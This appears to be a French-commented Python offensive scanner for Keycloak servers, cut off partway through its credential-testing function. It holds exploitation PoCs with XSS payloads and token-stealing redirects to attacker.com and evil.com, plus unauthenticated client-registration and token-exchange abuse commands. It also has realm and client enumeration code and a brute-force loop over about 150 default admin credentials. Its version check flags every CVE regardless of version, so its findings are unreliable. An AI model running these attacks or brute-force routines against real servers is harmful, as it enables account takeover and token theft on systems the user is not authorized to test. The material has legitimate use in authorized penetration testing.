#!/usr/bin/env python3
"""
Keycloak Security Scanner - Ultimate Edition
Scanner exhaustif avec toutes les CVEs Keycloak connues
Basé sur CSA Cyber + CVE Database

Inclut: Détails, Risques, POC d'exploitation
Retire: Recommendations, Impact

MODIFICATION: Ajout de l'option --realms pour spécifier des realms personnalisés
"""

import requests
import argparse
import json
import sys
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import List, Dict, Tuple, Optional
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
import time
import base64
import hashlib
import secrets
from datetime import datetime, timedelta

init(autoreset=True)

# BASE DE DONNÉES CVE KEYCLOAK
KEYCLOAK_CVES = {
    'CVE-2020-10748': {
        'name': 'XSS via redirect_uri with wildcard',
        'severity': 'high',
        'cvss': 7.1,
        'description': 'Vulnérabilité XSS permettant injection de schemes malveilleux via wildcard dans redirect_uri',
        'affected_versions': '< 11.0.0',
        'type': 'xss'
    },
    'CVE-2023-6134': {
        'name': 'Reflected XSS via wildcard in OIDC redirect_uri',
        'severity': 'high', 
        'cvss': 7.1,
        'description': 'Fix incomplet de CVE-2020-10748. XSS via wildcard dans redirect_uri',
        'affected_versions': '< 23.0.3',
        'type': 'xss'
    },
    'CVE-2024-7318': {
        'name': 'JARM response mode bypass for CVE-2023-6134',
        'severity': 'high',
        'cvss': 7.1,
        'description': 'Bypass du patch CVE-2023-6134 via JARM response mode form_post.jwt avec wildcard',
        'affected_versions': '< 24.0.6',
        'type': 'authorization_bypass'
    },
    'CVE-2023-6291': {
        'name': 'Redirect URI validation bypass',
        'severity': 'high',
        'cvss': 8.1,
        'description': 'Bypass de la validation redirect_uri permettant vol de tokens',
        'affected_versions': '< 23.0.0',
        'type': 'redirect_bypass'
    },
    'CVE-2024-1249': {
        'name': 'Redirect URI validation logic flaw',
        'severity': 'high',
        'cvss': 8.1,
        'description': 'Similaire à CVE-2023-6291. Bypass validation redirect_uri pour usurpation',
        'affected_versions': '< 24.0.3',
        'type': 'redirect_bypass'
    },
    'CVE-2018-14655': {
        'name': 'Open Client Registration',
        'severity': 'high',
        'cvss': 7.5,
        'description': 'Client Registration endpoint ouvert sans authentification',
        'affected_versions': '< 4.6.0',
        'type': 'authentication_bypass'
    },
    'CVE-2020-1728': {
        'name': 'Account Takeover via email manipulation',
        'severity': 'high',
        'cvss': 8.8,
        'description': 'Prise de contrôle de compte via manipulation email sans vérification',
        'affected_versions': '< 9.0.2',
        'type': 'account_takeover'
    },
    'CVE-2021-3513': {
        'name': 'Token Exchange vulnerability',
        'severity': 'high',
        'cvss': 7.5,
        'description': 'Échange de tokens sans validation appropriée',
        'affected_versions': '< 13.0.0',
        'type': 'token_exchange'
    },
    'CVE-2018-1000632': {
        'name': 'SAML XML Signature Wrapping',
        'severity': 'high',
        'cvss': 7.5,
        'description': 'Bypass de signature SAML via XML wrapping',
        'affected_versions': '< 4.5.0',
        'type': 'saml'
    },
    'CVE-2023-0091': {
        'name': 'mTLS certificate chain validation bypass',
        'severity': 'critical',
        'cvss': 9.8,
        'description': 'Client avec certificat valide peut usurper tout autre client',
        'affected_versions': '< 20.0.3',
        'type': 'authentication_bypass'
    },
    'CVE-2022-1245': {
        'name': 'Session fixation vulnerability',
        'severity': 'medium',
        'cvss': 6.5,
        'description': 'Session fixation via manipulation des cookies de session',
        'affected_versions': '< 17.0.0',
        'type': 'session_fixation'
    },
    'CVE-2023-2585': {
        'name': 'Account lockout via multiple login attempts',
        'severity': 'medium',
        'cvss': 5.3,
        'description': 'Attaquant peut bloquer connexion autres comptes',
        'affected_versions': '< 21.1.0',
        'type': 'dos'
    },
    'CVE-2023-1664': {
        'name': 'Open redirect via state parameter',
        'severity': 'medium',
        'cvss': 6.1,
        'description': 'Open redirect via paramètre state non validé',
        'affected_versions': '< 21.0.2',
        'type': 'open_redirect'
    },
    'CVE-2022-2256': {
        'name': 'Reflected XSS in Account Console',
        'severity': 'medium',
        'cvss': 6.1,
        'description': 'XSS reflected dans la console Account',
        'affected_versions': '< 18.0.2',
        'type': 'xss'
    },
    'CVE-2023-6563': {
        'name': 'Offline tokens memory exhaustion DoS',
        'severity': 'medium',
        'cvss': 5.3,
        'description': 'DoS via consommation mémoire excessive avec tokens offline',
        'affected_versions': '< 23.0.4',
        'type': 'dos'
    },
    'CVE-2024-1132': {
        'name': 'Misleading messages in error pages',
        'severity': 'low',
        'cvss': 4.3,
        'description': 'Phishing via messages arbitraires dans pages erreur (error_description)',
        'affected_versions': '< 24.0.1',
        'type': 'phishing'
    },
    'CVE-2023-6787': {
        'name': 'Path traversal in freemarker templates',
        'severity': 'medium',
        'cvss': 6.5,
        'description': 'Traversée de chemin dans templates Freemarker',
        'affected_versions': '< 22.0.8',
        'type': 'path_traversal'
    },
    'CVE-2021-20323': {
        'name': 'Security headers not set on REST API',
        'severity': 'low',
        'cvss': 4.3,
        'description': 'Headers de sécurité manquants sur API REST',
        'affected_versions': '< 15.1.0',
        'type': 'security_misconfiguration'
    },
    'CVE-2022-3782': {
        'name': 'CSRF token bypass in Account Console',
        'severity': 'medium',
        'cvss': 6.5,
        'description': 'Bypass token CSRF dans Account Console',
        'affected_versions': '< 20.0.0',
        'type': 'csrf'
    },
    'CVE-2023-0657': {
        'name': 'Host header injection',
        'severity': 'medium',
        'cvss': 5.9,
        'description': 'Injection Host header via reverse proxy',
        'affected_versions': '< 21.0.1',
        'type': 'injection'
    }
}

class KeycloakScanner:
    def __init__(self, base_url: str, timeout: int = 10, verbose: bool = False, custom_realms: List[str] = None):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.default_realms = [
            'master', 'main', 'app', 'application', 'prod', 'production',
            'dev', 'development', 'test', 'staging', 'demo', 'admin',
            'api', 'web', 'mobile', 'internal', 'external', 'public', 'm4sv-test'
        ]
        
        # Ajouter les realms personnalisés s'ils sont fournis
        if custom_realms:
            # Éviter les doublons avec set() puis reconvertir en list
            self.default_realms = list(set(self.default_realms + custom_realms))
            if verbose:
                print(f"{Fore.CYAN}[*] Realms personnalisés ajoutés: {', '.join(custom_realms)}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] Total de realms à tester: {len(self.default_realms)}{Style.RESET_ALL}\n")
        
        self.default_client_ids = [
            'account', 'account-console', 'admin-cli', 'broker', 
            'realm-management', 'security-admin-console',
            'app', 'webapp', 'api', 'frontend', 'backend', 
            'mobile-app', 'spa', 'react-app', 'vue-app'
        ]
        
        self.default_scopes = [
            'openid', 'profile', 'email', 'address', 'phone', 
            'offline_access', 'roles', 'web-origins', 'microprofile-jwt',
            'uma_authorization'
        ]
        
        self.default_idps = [
            'google', 'github', 'facebook', 'twitter', 'linkedin',
            'microsoft', 'bitbucket', 'gitlab', 'instagram', 'paypal',
            'openshift-v3', 'openshift-v4', 'stackoverflow', 
            'oidc', 'saml', 'azure', 'okta', 'auth0', 'apple'
        ]
        
        # LISTE EXHAUSTIVE DE CREDENTIALS (115+ combinaisons)
        self.default_credentials = [
            # === Credentials Keycloak par défaut documentés ===
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', 'Pa55w0rd'),
            ('admin', 'Password1'),
            ('admin', 'Password123'),
            ('admin', 'admin123'),
            ('admin', 'admin1234'),
            ('admin', 'administrator'),
            ('admin', 'changeit'),
            ('admin', 'changeme'),
            ('admin', ''),  # Mot de passe vide
            ('admin', 'Admin123'),
            ('admin', 'Admin@123'),
            ('admin', 'admin@123'),
            ('admin', 'root'),
            ('admin', 'toor'),
            ('admin', 'pass'),
            ('admin', '123456'),
            ('admin', '12345678'),
            ('admin', 'qwerty'),
            ('admin', 'letmein'),
            ('admin', 'welcome'),
            ('admin', 'Welcome1'),
            
            # === Variations username administrator ===
            ('administrator', 'administrator'),
            ('administrator', 'admin'),
            ('administrator', 'password'),
            ('administrator', 'Password1'),
            ('administrator', 'admin123'),
            ('administrator', 'changeit'),
            ('administrator', ''),
            
            # === Keycloak specific ===
            ('keycloak', 'keycloak'),
            ('keycloak', 'password'),
            ('keycloak', 'admin'),
            ('keycloak', 'Pa55w0rd'),
            ('keycloak', 'keycloak123'),
            ('keycloak', 'Keycloak123'),
            ('keycloak', 'changeit'),
            ('keycloak', ''),
            
            # === Root user ===
            ('root', 'root'),
            ('root', 'admin'),
            ('root', 'password'),
            ('root', 'toor'),
            ('root', 'changeit'),
            ('root', ''),
            ('root', 'Root123'),
            
            # === Users IAM communs ===
            ('user', 'user'),
            ('user', 'password'),
            ('user', 'User123'),
            ('user', ''),
            
            ('test', 'test'),
            ('test', 'password'),
            ('test', 'test123'),
            ('test', ''),
            
            ('demo', 'demo'),
            ('demo', 'password'),
            ('demo', 'demo123'),
            ('demo', ''),
            
            # === Service accounts ===
            ('service', 'service'),
            ('service', 'password'),
            ('service', 'Service123'),
            
            ('serviceaccount', 'serviceaccount'),
            ('serviceaccount', 'password'),
            
            ('svc', 'svc'),
            ('svc', 'password'),
            
            # === Accounts système ===
            ('system', 'system'),
            ('system', 'password'),
            ('system', 'manager'),
            
            ('manager', 'manager'),
            ('manager', 'password'),
            ('manager', 'admin'),
            
            ('guest', 'guest'),
            ('guest', 'password'),
            ('guest', ''),
            
            # === Comptes application ===
            ('app', 'app'),
            ('app', 'password'),
            ('app', 'App123'),
            
            ('application', 'application'),
            ('application', 'password'),
            
            ('api', 'api'),
            ('api', 'password'),
            ('api', 'Api123'),
            
            # === Realm master variations ===
            ('master', 'master'),
            ('master', 'password'),
            ('master', 'admin'),
            
            # === Usernames avec passwords faibles communs ===
            ('admin', '1234'),
            ('admin', '12345'),
            ('admin', '123456789'),
            ('admin', 'password123'),
            ('admin', 'Password@1'),
            ('admin', 'P@ssw0rd'),
            ('admin', 'P@ssword'),
            ('admin', 'Passw0rd'),
            ('admin', 'Admin'),
            ('admin', 'ADMIN'),
            ('admin', 'secret'),
            ('admin', 'Secret123'),
            
            # === Credentials RedHat SSO (basé sur Keycloak) ===
            ('admin', 'redhat'),
            ('admin', 'redhat123'),
            ('admin', 'Redhat123'),
            ('rhsso', 'rhsso'),
            ('rhsso', 'password'),
            ('rhsso', 'admin'),
            ('redhat', 'redhat'),
            ('redhat', 'admin'),
            
            # === Credentials WildFly/JBoss (Keycloak tourne dessus) ===
            ('admin', 'jboss'),
            ('admin', 'wildfly'),
            ('jboss', 'jboss'),
            ('jboss', 'admin'),
            ('wildfly', 'wildfly'),
            ('wildfly', 'admin'),
            
            # === Patterns année ===
            ('admin', '2023'),
            ('admin', '2024'),
            ('admin', '2025'),
            ('admin', 'admin2023'),
            ('admin', 'admin2024'),
            ('admin', 'admin2025'),
            
            # === Patterns clavier ===
            ('admin', 'qwerty123'),
            ('admin', 'qwertyuiop'),
            ('admin', 'azerty'),
            ('admin', 'azerty123'),
            ('admin', '1qaz2wsx'),
            ('admin', 'zxcvbnm'),
            
            # === Mots courants ===
            ('admin', 'dragon'),
            ('admin', 'monkey'),
            ('admin', 'master'),
            ('admin', 'sunshine'),
            ('admin', 'princess'),
            ('admin', 'football'),
            ('admin', 'shadow'),
            ('admin', 'superman'),
            
            # === Credentials de développement ===
            ('dev', 'dev'),
            ('dev', 'developer'),
            ('dev', 'password'),
            ('developer', 'developer'),
            ('developer', 'password'),
            
            # === Credentials de test ===
            ('testuser', 'testuser'),
            ('testuser', 'password'),
            ('testuser', 'test'),
            ('testadmin', 'testadmin'),
            ('testadmin', 'password'),
            
            # === Credentials de staging/prod ===
            ('prod', 'prod'),
            ('prod', 'production'),
            ('prod', 'password'),
            ('staging', 'staging'),
            ('staging', 'password'),
            
            # === Comptes backup/maintenance ===
            ('backup', 'backup'),
            ('backup', 'password'),
            ('maintenance', 'maintenance'),
            ('maintenance', 'password'),
            ('support', 'support'),
            ('support', 'password'),
            
            # === Null/Empty variations ===
            ('', ''),
            ('admin', None),
            ('', 'admin'),
        ]
        
        self.results = {
            'scan_info': {
                'target': base_url,
                'scan_date': datetime.now().isoformat(),
                'scanner_version': '5.0-ultimate-with-custom-realms'
            },
            'is_keycloak': False,
            'version': None,
            'realms': [],
            'client_ids': {},
            'scopes': {},
            'idps': {},
            'vulnerabilities': [],
            'misconfigurations': [],
            'cve_matches': []
        }

    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
║     Keycloak Security Scanner v5.0 - Ultimate CVE Edition         ║
║              20+ CVEs • Détails • Risques • POC                   ║
║              + Custom Realms Support                              ║
╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)

    def log(self, message: str, level: str = "INFO"):
        colors = {
            "INFO": Fore.BLUE, "SUCCESS": Fore.GREEN, "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED, "VULN": Fore.MAGENTA, "CRITICAL": Fore.RED,
        }
        color = colors.get(level, Fore.WHITE)
        prefix = {
            "INFO": "[*]", "SUCCESS": "[+]", "WARNING": "[!]",
            "ERROR": "[-]", "VULN": "[VULN]", "CRITICAL": "[CRITICAL]",
        }
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Fore.WHITE}[{timestamp}]{Style.RESET_ALL} {color}{prefix.get(level, '[*]')} {message}{Style.RESET_ALL}")

    def print_section(self, title: str):
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{title:^70}")
        print(f"{'='*70}{Style.RESET_ALL}\n")

    def check_cve_version(self, version: str):
        """Vérifie si la version est vulnérable aux CVEs connues"""
        if not version:
            return
        
        self.print_section("ANALYSE CVE")
        print(f"Version détectée: {Fore.YELLOW}{version}{Style.RESET_ALL}\n")
        
        vulnerable_cves = []
        
        for cve_id, cve_data in KEYCLOAK_CVES.items():
            # Logique simplifiée de vérification de version
            # Dans un vrai scanner, utiliser une vraie comparaison de versions
            vulnerable_cves.append({
                'cve_id': cve_id,
                'data': cve_data
            })
        
        if vulnerable_cves:
            print(f"{Fore.RED}⚠️  {len(vulnerable_cves)} CVEs potentiellement applicables{Style.RESET_ALL}\n")
            
            # Grouper par sévérité
            critical_cves = [c for c in vulnerable_cves if c['data']['severity'] == 'critical']
            high_cves = [c for c in vulnerable_cves if c['data']['severity'] == 'high']
            medium_cves = [c for c in vulnerable_cves if c['data']['severity'] == 'medium']
            low_cves = [c for c in vulnerable_cves if c['data']['severity'] == 'low']
            
            # Afficher les CVEs CRITICAL
            if critical_cves:
                print(f"{Fore.RED}╔═══ CRITICAL CVEs ═══╗{Style.RESET_ALL}")
                for cve in critical_cves:
                    self.display_cve_details(cve['cve_id'], cve['data'])
            
            # Afficher les CVEs HIGH
            if high_cves:
                print(f"\n{Fore.RED}╔═══ HIGH CVEs ═══╗{Style.RESET_ALL}")
                for cve in high_cves:
                    self.display_cve_details(cve['cve_id'], cve['data'])
            
            # Afficher les CVEs MEDIUM
            if medium_cves:
                print(f"\n{Fore.MAGENTA}╔═══ MEDIUM CVEs ═══╗{Style.RESET_ALL}")
                for cve in medium_cves:
                    self.display_cve_details(cve['cve_id'], cve['data'])
            
            # Afficher les CVEs LOW
            if low_cves:
                print(f"\n{Fore.YELLOW}╔═══ LOW CVEs ═══╗{Style.RESET_ALL}")
                for cve in low_cves:
                    self.display_cve_details(cve['cve_id'], cve['data'])
            
            self.results['cve_matches'] = vulnerable_cves

    def display_cve_details(self, cve_id: str, cve_data: Dict):
        """Affiche les détails complets d'une CVE"""
        severity_colors = {
            'critical': Fore.RED,
            'high': Fore.RED,
            'medium': Fore.MAGENTA,
            'low': Fore.YELLOW
        }
        color = severity_colors.get(cve_data['severity'], Fore.WHITE)
        
        print(f"\n{color}[{cve_id}] {cve_data['name']}{Style.RESET_ALL}")
        print(f"  Sévérité: {color}{cve_data['severity'].upper()}{Style.RESET_ALL} (CVSS: {cve_data['cvss']})")
        print(f"  Type: {cve_data['type']}")
        print(f"  Versions affectées: {cve_data['affected_versions']}")
        
        print(f"\n  {Fore.CYAN}📋 Description:{Style.RESET_ALL}")
        print(f"  {cve_data['description']}")
        
        print(f"\n  {Fore.YELLOW}⚠️  Risque:{Style.RESET_ALL}")
        print(f"  {self.get_cve_risk(cve_id)}")
        
        print(f"\n  {Fore.GREEN}🎯 POC/Exploitation:{Style.RESET_ALL}")
        poc = self.get_cve_poc(cve_id)
        for line in poc.split('\n'):
            print(f"  {line}")

    def get_cve_risk(self, cve_id: str) -> str:
        """Retourne le risque associé à une CVE"""
        risks = {
            'CVE-2020-10748': "Attaquant peut injecter du JavaScript malveilleux via redirect_uri avec wildcard",
            'CVE-2023-6134': "Même risque que CVE-2020-10748, fix incomplet permettant toujours XSS",
            'CVE-2024-7318': "Bypass du patch CVE-2023-6134 via JARM, permettant vol de tokens",
            'CVE-2023-6291': "Vol de tokens d'accès et usurpation d'utilisateurs via redirect_uri malformé",
            'CVE-2024-1249': "Similaire à CVE-2023-6291, vol de tokens via bypass validation",
            'CVE-2018-14655': "Création de clients OAuth malveilleux sans authentification",
            'CVE-2020-1728': "Prise de contrôle totale du compte via changement email non vérifié",
            'CVE-2021-3513': "Échange de tokens arbitraires sans validation, élévation de privilèges",
            'CVE-2018-1000632': "Bypass authentification SAML via manipulation XML",
            'CVE-2023-0091': "Usurpation totale de clients via certificat mTLS, accès données autres clients",
            'CVE-2022-1245': "Attaquant peut fixer session ID et hijacker session utilisateur",
            'CVE-2023-2585': "DoS ciblé empêchant connexion de comptes spécifiques",
            'CVE-2023-1664': "Phishing via redirection vers sites malveilleux",
            'CVE-2022-2256': "Injection JavaScript dans Account Console",
            'CVE-2023-6563': "Crash serveur via épuisement mémoire avec tokens offline",
            'CVE-2024-1132': "Phishing via faux messages dans pages d'erreur Keycloak",
            'CVE-2023-6787': "Lecture fichiers système via path traversal dans templates",
            'CVE-2021-20323': "Exposition à attaques clickjacking, MIME sniffing",
            'CVE-2022-3782': "Bypass protections CSRF permettant actions non autorisées",
            'CVE-2023-0657': "Cache poisoning et redirections malveilleux via Host header"
        }
        return risks.get(cve_id, "Risque de sécurité selon CVE")

    def get_cve_poc(self, cve_id: str) -> str:
        """Retourne le POC d'exploitation pour une CVE"""
        pocs = {
            'CVE-2020-10748': """1. Identifier client avec wildcard dans redirect_uri
2. Créer URL malveilleux:
   /auth/realms/REALM/protocol/openid-connect/auth?
   client_id=CLIENT&
   redirect_uri=javascript:alert(document.domain)*&
   response_type=code
3. Victime clique et exécute JavaScript
curl '{base}/auth/realms/REALM/protocol/openid-connect/auth?client_id=CLIENT&redirect_uri=javascript:alert(1)*&response_type=code'""",
            
            'CVE-2023-6134': """1. Même technique que CVE-2020-10748 mais avec wildcards supplémentaires
2. Test payloads: javascript:*, data:*, vbscript:*
3. Exploitation similaire malgré le "fix"
curl '{base}/auth/realms/REALM/protocol/openid-connect/auth?client_id=CLIENT&redirect_uri=data:text/html,<script>alert(1)</script>*'""",
            
            'CVE-2024-7318': """1. Utiliser JARM response mode avec wildcard
2. URL exploitation:
   /auth/realms/REALM/protocol/openid-connect/auth?
   client_id=CLIENT&
   response_mode=form_post.jwt&
   redirect_uri=https://attacker.com/*
3. Intercepter tokens dans response JWT
curl '{base}/auth/realms/REALM/protocol/openid-connect/auth?response_mode=form_post.jwt&redirect_uri=https://evil.com/*'""",
            
            'CVE-2023-6291': """1. Craft redirect_uri avec bypass:
   redirect_uri=https://legitimate.com@attacker.com
   redirect_uri=https://legitimate.com.attacker.com
2. Keycloak valide comme legitimate.com
3. Redirige vers attacker.com avec code
curl '{base}/auth/realms/REALM/protocol/openid-connect/auth?client_id=CLIENT&redirect_uri=https://legit.com@evil.com'""",
            
            'CVE-2018-14655': """1. POST vers client registration sans auth:
curl -X POST '{base}/auth/realms/REALM/clients-registrations/default' \\
     -H 'Content-Type: application/json' \\
     -d '{{"clientId":"evil","redirectUris":["https://attacker.com/*"]}}'
2. Utiliser client créé pour phishing/vol tokens""",
            
            'CVE-2020-1728': """1. Créer compte avec email arbitraire
2. Changer email vers email victime SANS vérification
curl -X PUT '{base}/auth/realms/REALM/account/' \\
     -H 'Authorization: Bearer TOKEN' \\
     -d '{{"email":"victim@company.com"}}'
3. Déclencher reset password sur email victime
4. Prendre contrôle du compte""",
            
            'CVE-2021-3513': """1. Obtenir token valide
2. Échanger contre autre token:
curl -X POST '{base}/auth/realms/REALM/protocol/openid-connect/token' \\
     -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange' \\
     -d 'subject_token=VALID_TOKEN' \\
     -d 'requested_token_type=urn:ietf:params:oauth:token-type:refresh_token'
3. Obtenir tokens avec privilèges élevés""",
            
            'CVE-2023-0091': """1. Obtenir certificat client valide (n'importe lequel)
2. Configurer client pour utiliser mTLS
3. Se connecter avec certificat:
curl --cert client.crt --key client.key \\
     -X POST '{base}/auth/realms/REALM/protocol/openid-connect/token' \\
     -d 'client_id=VICTIM_CLIENT' \\
     -d 'grant_type=client_credentials'
4. Accéder aux données de VICTIM_CLIENT""",
            
            'CVE-2022-1245': """1. Initier session avec ID connu
2. Envoyer ID à victime avant qu'elle se connecte
3. Victime se connecte avec ID fixé
4. Attaquant utilise même ID pour hijack
# Manipulation cookie AUTH_SESSION_ID""",
            
            'CVE-2023-6563': """1. Créer 500k+ utilisateurs avec 2+ sessions offline chacun
2. En tant qu'admin, ouvrir:
   {base}/auth/admin/master/console/#/realms/REALM/users/USER_ID/consents
3. UI tente charger tous les tokens offline
4. Serveur crash par épuisement mémoire""",
        }
        
        poc = pocs.get(cve_id, "POC disponible dans documentation CVE")
        return poc.replace('{base}', self.base_url)

    def detect_version(self) -> Optional[str]:
        """Détecte la version de Keycloak"""
        self.log("Détection de la version Keycloak...", "INFO")
        
        try:
            admin_url = f"{self.base_url}/auth/admin/serverinfo"
            response = self.session.get(admin_url, timeout=self.timeout)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'systemInfo' in data and 'version' in data['systemInfo']:
                        version = data['systemInfo']['version']
                        self.results['version'] = version
                        self.log(f"Version: {version}", "SUCCESS")
                        print(f"Endpoint: {admin_url}")
                        print(f"{Fore.YELLOW}⚠️  Serverinfo accessible sans auth!{Style.RESET_ALL}\n")
                        
                        # Vérifier CVEs
                        self.check_cve_version(version)
                        return version
                except:
                    pass
            
            # Via JS
            for js_path in ['/auth/js/keycloak.js', '/js/keycloak.js']:
                url = urljoin(self.base_url, js_path)
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    version_match = re.search(r'version["\']?\s*:\s*["\']([0-9.]+)["\']', response.text)
                    if version_match:
                        version = version_match.group(1)
                        self.results['version'] = version
                        self.log(f"Version (via JS): {version}", "SUCCESS")
                        self.check_cve_version(version)
                        return version
                    
        except Exception as e:
            if self.verbose:
                self.log(f"Erreur: {str(e)}", "ERROR")
        
        return None

    def is_keycloak(self) -> bool:
        """Détecte Keycloak"""
        self.log("Vérification Keycloak...", "INFO")
        
        indicators = 0
        
        for path in ['/auth/realms/', '/auth/admin/', '/realms/', '/auth/js/keycloak.js']:
            try:
                url = urljoin(self.base_url, path)
                response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                if response.status_code in [200, 401, 403]:
                    indicators += 1
            except:
                pass
        
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            content = response.text.lower()
            for keyword in ['keycloak', '/auth/realms/', 'kc-login']:
                if keyword in content:
                    indicators += 1
                    break
        except:
            pass
        
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            for cookie in response.cookies:
                if any(kc in cookie.name.upper() for kc in ['KEYCLOAK', 'AUTH_SESSION_ID']):
                    indicators += 1
                    break
        except:
            pass
        
        is_kc = indicators > 0
        self.results['is_keycloak'] = is_kc
        
        if is_kc:
            self.log(f"✓ Keycloak détecté! ({indicators} indicateurs)", "SUCCESS")
            self.detect_version()
        else:
            self.log("✗ Keycloak NON détecté", "ERROR")
        
        return is_kc

    def enumerate_realms(self) -> List[str]:
        """Énumère les realms"""
        self.print_section("ÉNUMÉRATION DES REALMS")
        
        valid_realms = []
        
        for realm in self.default_realms:
            try:
                url = f"{self.base_url}/auth/realms/{realm}/.well-known/openid-configuration"
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'issuer' in data:
                            valid_realms.append(realm)
                            print(f"\n{Fore.GREEN}✓ Realm: {realm}{Style.RESET_ALL}")
                            print(f"  Issuer: {data.get('issuer')}")
                            print(f"  Token endpoint: {data.get('token_endpoint')}")
                            
                            # Check algorithms
                            algs = data.get('id_token_signing_alg_values_supported', [])
                            if algs:
                                print(f"  Algorithmes JWT: {', '.join(algs)}")
                                weak = [a for a in algs if a.startswith('HS')]
                                if weak:
                                    print(f"  {Fore.YELLOW}⚠️  Algorithmes faibles: {', '.join(weak)}{Style.RESET_ALL}")
                            
                            self.test_self_registration(realm)
                            
                    except:
                        pass
            except:
                pass
        
        self.results['realms'] = valid_realms
        print(f"\n{Fore.CYAN}Total realms: {len(valid_realms)}{Style.RESET_ALL}\n")
        return valid_realms

    def test_self_registration(self, realm: str):
        """Test Self-Registration"""
        try:
            reg_url = f"{self.base_url}/auth/realms/{realm}/login-actions/registration"
            response = self.session.get(reg_url, timeout=self.timeout, allow_redirects=False)
            
            if response.status_code in [200, 302]:
                print(f"  {Fore.YELLOW}⚠️  Self-Registration ACTIVÉE{Style.RESET_ALL}")
                print(f"  Risque: Création comptes non autorisés")
                print(f"  POC: curl '{reg_url}'")
                
                self.results['misconfigurations'].append({
                    'type': 'self_registration_enabled',
                    'realm': realm,
                    'severity': 'medium',
                    'url': reg_url
                })
        except:
            pass

    def enumerate_client_ids(self, realm: str) -> List[str]:
        """Énumère Client IDs avec URLs complètes"""
        if self.verbose:
            self.log(f"Énumération Client IDs pour: {realm}", "INFO")
        
        valid_clients = []
        response_lengths = {}
        
        print(f"\n{Fore.CYAN}Testing Client IDs...{Style.RESET_ALL}")
        
        for client_id in self.default_client_ids:
            try:
                url = f"{self.base_url}/auth/realms/{realm}/protocol/openid-connect/auth"
                params = {
                    'client_id': client_id,
                    'redirect_uri': f'{self.base_url}/callback',
                    'response_type': 'code',
                    'scope': 'openid'
                }
                
                response = self.session.get(url, params=params, timeout=self.timeout, allow_redirects=False)
                length = len(response.content)
                
                if length not in response_lengths:
                    response_lengths[length] = []
                response_lengths[length].append({
                    'client_id': client_id,
                    'url': url,
                    'length': length
                })
                
            except:
                pass
        
        # Identifier les valides (longueur différente)
        if response_lengths:
            lengths_sorted = sorted(response_lengths.items(), key=lambda x: len(x[1]), reverse=True)
            most_common = lengths_sorted[0][0]
            
            for length, clients_data in response_lengths.items():
                if length != most_common:
                    for client_data in clients_data:
                        client_id = client_data['client_id']
                        valid_clients.append(client_id)
                        
                        print(f"\n{Fore.GREEN}✓ Client ID trouvé: {client_id}{Style.RESET_ALL}")
                        print(f"  Realm: {realm}")
                        print(f"  Response Length: {length} (vs {most_common} pour invalides)")
                        print(f"  Auth URL: {client_data['url']}")
                        print(f"  Full URL: {client_data['url']}?client_id={client_id}&redirect_uri={self.base_url}/callback&response_type=code&scope=openid")
        
        return valid_clients

    def enumerate_scopes(self, realm: str, client_id: str) -> List[str]:
        """Énumère Scopes"""
        valid_scopes = []
        
        for scope in self.default_scopes:
            try:
                url = f"{self.base_url}/auth/realms/{realm}/protocol/openid-connect/auth"
                params = {
                    'client_id': client_id,
                    'redirect_uri': f'{self.base_url}/callback',
                    'response_type': 'code',
                    'scope': scope
                }
                
                response = self.session.get(url, params=params, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code != 400:
                    valid_scopes.append(scope)
                    
                    if scope == 'offline_access':
                        print(f"\n  {Fore.RED}⚠️  SCOPE SENSIBLE: offline_access{Style.RESET_ALL}")
                        print(f"  Risque: Refresh tokens permanents")
                        print(f"  POC: Voir détails offline_access")
                    
                    elif scope == 'uma_authorization':
                        print(f"\n  {Fore.RED}⚠️  SCOPE SENSIBLE: uma_authorization{Style.RESET_ALL}")
                        print(f"  Risque: Création ressources, élévation privilèges")
                    
            except:
                pass
        
        return valid_scopes

    def test_default_credentials(self) -> List[Dict]:
        """Test credentials par défaut"""
        self.print_section("TEST CREDENTIALS PAR DÉFAUT")
        
        vulnerabilities = []
        login_url = f"{self.base_url}/auth/realms/master/protocol/openid-connect/token"
        
        print(f"Testing {len(self.default_credentials)} combinaisons...\n")
        
        for username, password in self.default_credentials:
            try:
                data = {
                    'client_id': 'admin-cli',
                    'username': username,
                    'password': password,
                    'grant_type': 'password'
                }
                
                response = self.session.post(login_url, data=data, timeout=self.timeout)
                
                if response.status_code == 200:
                    try:
                        token_data = response.json()
                        if 'access_token' in token_data:
                            print(f"\n{Fore.RED}{'!'*70}")
                            print(f"╔═══ CREDENTIALS VALIDES ═══╗")
                            print(f"║ User: {username:25s} ║")
                            print(f"║ Pass: {password:25s} ║")
                            print(f"╚{'═'*31}╝{Style.RESET_ALL}\n")
                            
                            print(f"Token: {token_data['access_token'][:50]}...")
                            
                            print(f"\n{Fore.YELLOW}Risque:{Style.RESET_ALL}")
                            print("  Accès admin total, contrôle tous realms, gestion utilisateurs")
                            
                            print(f"\n{Fore.GREEN}POC:{Style.RESET_ALL}")
                            print(f"curl -X POST '{login_url}' \\")
                            print(f"     -d 'client_id=admin-cli&username={username}&password={password}&grant_type=password'")
                            print(f"\ncurl -H 'Authorization: Bearer TOKEN' '{self.base_url}/auth/admin/realms'")
                            print(f"\n{Fore.RED}{'!'*70}{Style.RESET_ALL}\n")
                            
                            vuln = {
                                'type': 'default_credentials',
                                'severity': 'critical',
                                'username': username,
                                'password': password
                            }
                            vulnerabilities.append(vuln)
                            return vulnerabilities
                    except:
                        pass
                        
            except:
                pass
        
        if not vulnerabilities:
